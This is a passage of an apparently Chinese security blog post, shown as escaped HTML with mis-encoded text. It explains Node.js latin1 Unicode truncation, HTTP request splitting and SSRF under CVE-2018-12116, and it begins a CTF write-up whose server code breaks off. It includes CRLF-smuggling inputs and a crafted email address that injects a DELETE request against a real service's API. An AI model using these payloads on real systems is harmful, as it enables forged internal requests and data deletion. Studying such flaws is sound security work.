&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205103409976.png" alt="image-20211205103409976">&lt;/p>
&lt;p>ä¸¤å­—èŠ‚çš„unicodeç¼–ç ç”¨&lt;code>latin1&lt;/code>è½¬æ¢ä¸ºå•å­—èŠ‚æ—¶ä¼šè¢«æˆªå»å¼€å¤´çš„ç¬¬ä¸€ä¸ªå­—èŠ‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{5b}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{015b}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{0128}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{28}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205103625305.png" alt="image-20211205103625305">&lt;/p>
&lt;hr>
&lt;p>é‚£è¿™ä¸ªNode.jsçš„å®‰å…¨é—®é¢˜è·ŸSSRFåˆæ˜¯æ€ä¹ˆè”ç³»åˆ°ä¸€èµ·çš„å‘¢ï¼Ÿå¤„ç†ç”¨æˆ·è¾“å…¥æ—¶å‡ºç°äº†æ•°æ®æŸåæ˜¯ä¸ªæ˜æ˜¾çš„å±é™©ä¿¡å·&lt;/p>
&lt;h2 id="http-request-splitting">HTTP Request Splitting&lt;/h2>
&lt;blockquote>
&lt;p>&lt;em>This entails the adversary injecting malicious user input into various standard and/or user defined HTTP headers within a HTTP Request through user input of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters and unique character encoding. This malicious user input allows for web script to be injected in HTTP headers as well as into browser cookies or Ajax web/browser object parameters like XMLHttpRequest during implementation of asynchronous requests.&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>é€šä¿—æ¥è¯´ï¼Œå°±æ˜¯åŸæœ¬1ä¸ªè¯·æ±‚å¯¹åº”1æ¬¡å“åº”ï¼Œç°åœ¨æˆ‘ä»¬å¯¹è¯·æ±‚çš„bodyéƒ¨åˆ†å†æ·»åŠ 1ä¸ªè¯·æ±‚ï¼Œå¯¼è‡´çœ‹ä¼¼å‘é€äº†1æ¬¡è¯·æ±‚å®åˆ™ä¼šè¢«è§£é‡Šä¸º2ä¸ªå“åº”è¢«åŠ è½½å‡ºæ¥ï¼Œä¼šé€ æˆXSSå’ŒSSRF&lt;/p>
&lt;p>ä¸¾ä¸€ä¸ªç®€å•çš„å°æ —å­ï¼šä¸€èˆ¬çš„è¯·æ±‚å½¢å¼æ˜¯è¿™æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">GET&lt;/span> &lt;span style="color:#111">/private-api?q=&amp;lt;user-input-here&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½†æ˜¯æˆ‘ä»¬æ„é€ äº†è¿™æ ·çš„ç”¨æˆ·è¾“å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>x HTTP/1.1\r\n\r\nDELETE /private-api HTTP/1.1\r\n
&lt;/code>&lt;/pre>&lt;p>å½“è¯·æ±‚å‘å‡ºåï¼ŒæœåŠ¡ç«¯å°†ä¼šæ”¶åˆ°è¿™æ ·çš„è¯·æ±‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">GET&lt;/span> &lt;span style="color:#111">/private-api?q=x&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELETE /private-api HTTP/1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åŒ…å«äº†ä¸¤ä¸ªè¯·æ±‚æ–¹å¼ï¼Œå¦‚æœæœåŠ¡ç«¯æ²¡æœ‰è®¾ç½®ç‰¹æ®Šçš„è¿‡æ»¤åˆ™å¯èƒ½ä¼šå°†ä¸¤ä¸ªè¯·æ±‚å…¨éƒ¨æ‰§è¡Œå¹¶å›æ˜¾ï¼›è€Œå¦‚æœç¬¬äºŒä¸ªé¢å¤–çš„è¯·æ±‚åŒ…å«ä¸€äº›åªæœ‰æœåŠ¡ç«¯æœ¬åœ°æ‰èƒ½è®¿é—®åˆ°çš„å†…å®¹ï¼Œåˆ™ä¼šé€ æˆSSRF(Server-Side Request Forgery)&lt;/p>
&lt;h2 id="ssrf-via-request-splitting--cve-2018-12116">SSRF via Request Splitting / cve-2018-12116&lt;/h2>
&lt;p>æ­£å¦‚ä¸Šé¢æ —å­å±•ç¤ºçš„é‚£æ ·ï¼Œä¸è¿‡ä¸€èˆ¬httpåº“éƒ½ä¼šå¯¹è¿™ç§è¡Œä¸ºåšå‡ºé˜²èŒƒï¼›Node.jsä¹Ÿä¸ä¾‹å¤–ï¼Œæ¯”å¦‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://gqa6995cu69dkt0oxvzzzwzt0k6auz.burpcollaborator.net/\r\n/test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205160107403.png" alt="image-20211205160107403">&lt;/p>
&lt;p>æ¢æˆunicodeå‘¢ï¼Ÿç”»é£å¼€å§‹å¥‡æ€ªäº†&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;http://example.com/\u{010D}\u{010A}/test&amp;#39;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205160205490.png" alt="image-20211205160205490">&lt;/p>
&lt;p>ä¸Šé¢æˆ‘ä»¬æè¿‡çš„unicodeæˆªå»å¼€å¤´ç¬¬ä¸€ä¸ªå­—èŠ‚çš„äº‹æƒ…ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ &lt;code>\r\n&lt;/code>äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://example.com/\u{010D}\u{010A}/test&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205164009244.png" alt="image-20211205164009244">&lt;/p>
&lt;p>å½“Node.js&amp;lt;=8æ„é€ å¯¹è¿™æ ·çš„urlè¯·æ±‚æ—¶ï¼Œç”±äºä»–ä»¬ä¸æ˜¯HTTPæ§åˆ¶å­—ç¬¦æ‰€ä»¥ä¸ä¼šä¿®æ”¹ï¼ŒåŸæ ·è¾“å‡ºï¼›è€Œç»“åˆä¸Šé¢æˆ‘ä»¬æè¿‡çš„unicodeæˆªå»å¼€å¤´ç¬¬ä¸€ä¸ªå­—èŠ‚çš„äº‹æƒ…ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ &lt;code>\r\n&lt;/code>çš„CRLFiäº†&lt;/p>
&lt;p>ç°åœ¨çš„Node.jså‡å·²ä¿®å¤æ­¤é—®é¢˜ï¼Œå®˜æ–¹ä¿®å¤-&amp;gt;&lt;a href="https://github.com/nodejs/node/commit/dd20c0186f">http: add &amp;ndash;security-revert for CVE-2018-12116&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205163601837.png" alt="image-20211205163601837">&lt;/p>
&lt;p>æ—§ç‰ˆä¸­ä¼šç›´æ¥å¯¹è§£é‡Šä¸äº†çš„unicodeæŠ¥é”™ï¼Œè€Œä¸æ˜¯å°è¯•åŸå°ä¸åŠ¨çš„æ¬è¿‡å»è¯·æ±‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205163703908.png" alt="image-20211205163703908">&lt;/p>
&lt;h3 id="çœŸå®åœºæ™¯ä¸‹çš„æ¡ˆä¾‹">çœŸå®åœºæ™¯ä¸‹çš„æ¡ˆä¾‹&lt;/h3>
&lt;p>æ¥è‡ª-&amp;gt;&lt;a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">Security Bugs in Practice: SSRF via Request Splitting&lt;/a> å¼ºçƒˆå»ºè®®çœ‹åŸæ–‡&lt;/p>
&lt;p>ç«ç‹é‚®ç®±è´¦å·çš„å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨åç«¯äº¤äº’æµç¨‹æ˜¯è¿™æ ·çš„&lt;/p>
&lt;pre tabindex="0">&lt;code> +--------+ +--------+ +-----------+ +----------+
| Client | HTTP | API | HTTP | DataStore | SQL | MySQL |
| |&amp;lt;------&amp;gt;| Server |&amp;lt;------&amp;gt;| Service |&amp;lt;-----&amp;gt;| Database |
+--------+ +--------+ +-----------+ +----------+
&lt;/code>&lt;/pre>&lt;p>å®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚æ˜¯é€šè¿‡httpä¸API Serveräº¤äº’çš„ï¼Œæ¯”å¦‚ä¸€ä¸ªè¿™æ ·çš„è¯·æ±‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">GET /email/74657374406578616d706c652e636f6d
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼šå¾—åˆ°&lt;code>test@example.com&lt;/code>çš„é‚®ä»¶è®°å½•ï¼Œç”¨hexåšäº†è¯·æ±‚çš„è·¯ç”±ï¼Œä½†æ˜¯ä¸€ä¸ªåˆ é™¤æ“ä½œå´æ˜¯ç›´æ¥æ‹¼æ¥å­—ç¬¦ä¸²&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">DELETE /account/xyz/emails/test@example.com
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ­¤æ—¶ï¼Œæœ€åçš„ç«¯ç‚¹å¯æ§ï¼Œç»“åˆä¸Šé¢çš„bugï¼Œå½“æˆ‘ä»¬æ³¨å†Œè¿™æ ·ä¸€ä¸ªè´¦å·&lt;/p>
&lt;pre tabindex="0">&lt;code>x@Ì ÅˆÆ†Æ†ÉÄ¯1Ì®1ÄÌŠÄÌŠÉ†Í…Æ†Ì Ä¯accountÄ¯f9f9eebb05ef4b819b0467cc5ddd3b4aÄ¯sessionsÌ ÅˆÆ†Æ†ÉÄ¯1Ì®1ÄÌŠÄÌŠ.cc
&lt;/code>&lt;/pre>&lt;p>å®ƒå…¶å®æ˜¯è¿™æ ·&lt;/p>
&lt;pre tabindex="0">&lt;code>v = &amp;#39;x@Ì ÅˆÆ†Æ†ÉÄ¯1Ì®1ÄÌŠÄÌŠÉ†Í…Æ†Ì Ä¯accountÄ¯f9f9eebb05ef4b819b0467cc5ddd3b4aÄ¯sessionsÌ ÅˆÆ†Æ†ÉÄ¯1Ì®1ÄÌŠÄÌŠ.cc&amp;#39;
Buffer.from(v.toLowerCase(), &amp;#34;latin1&amp;#34;).toString()
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205205928287.png" alt="image-20211205205928287">&lt;/p>
&lt;p>&lt;del>çœŸæ˜¯Node.jsçš„ç¾å¦™ç‰¹æ€§&lt;/del>&lt;/p>
&lt;p>å¯¹è¿™æ ·ä¸€ä¸ªè´¦å·å†æ¬¡è¿›è¡ŒDELETEè¯·æ±‚æ—¶åˆ™ä¼šè¿™æ ·&lt;/p>
&lt;pre tabindex="0">&lt;code>console.log(Buffer.from(&amp;#39;DELETE /account/f9f9eebb05ef4b819b0467cc5ddd3b4a/email/x@Ì ÅˆÉ”É”ÉÄ¯1Ì®1ÄÌŠÄÌŠÉ‡Í…É”Ì Ä¯accountÄ¯f9f9eebb05ef4b819b0467cc5ddd3b4aÄ¯sessionsÌ ÅˆÉ”É”ÉÄ¯1Ì®1ÄÌŠÄÌŠ.cc&amp;#39;, &amp;#39;latin1&amp;#39;).toString())
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205210133004.png" alt="image-20211205210133004">&lt;/p>
&lt;p>SSRFæ¥äº†&lt;/p>
&lt;h2 id="asisctf-final-2018proxy-proxy">[ASISCTF final 2018]Proxy-Proxy&lt;/h2>
&lt;p>ç®€å•å®¡äº†ä¸€ä¸‹ä»£ç ï¼Œæ ‡è®°åˆ°æ³¨é‡Šä¸­äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">body_parser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;body-parser&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;md5&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ip&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;x-date&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">body_parser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">urlencoded&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">extended&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;views&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;views&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;view engine&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;jade&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">check_endpoint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">endpoint&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#00a8c8">of&lt;/span> &lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">endpoint&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;flag.dat&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">;&lt;/span>
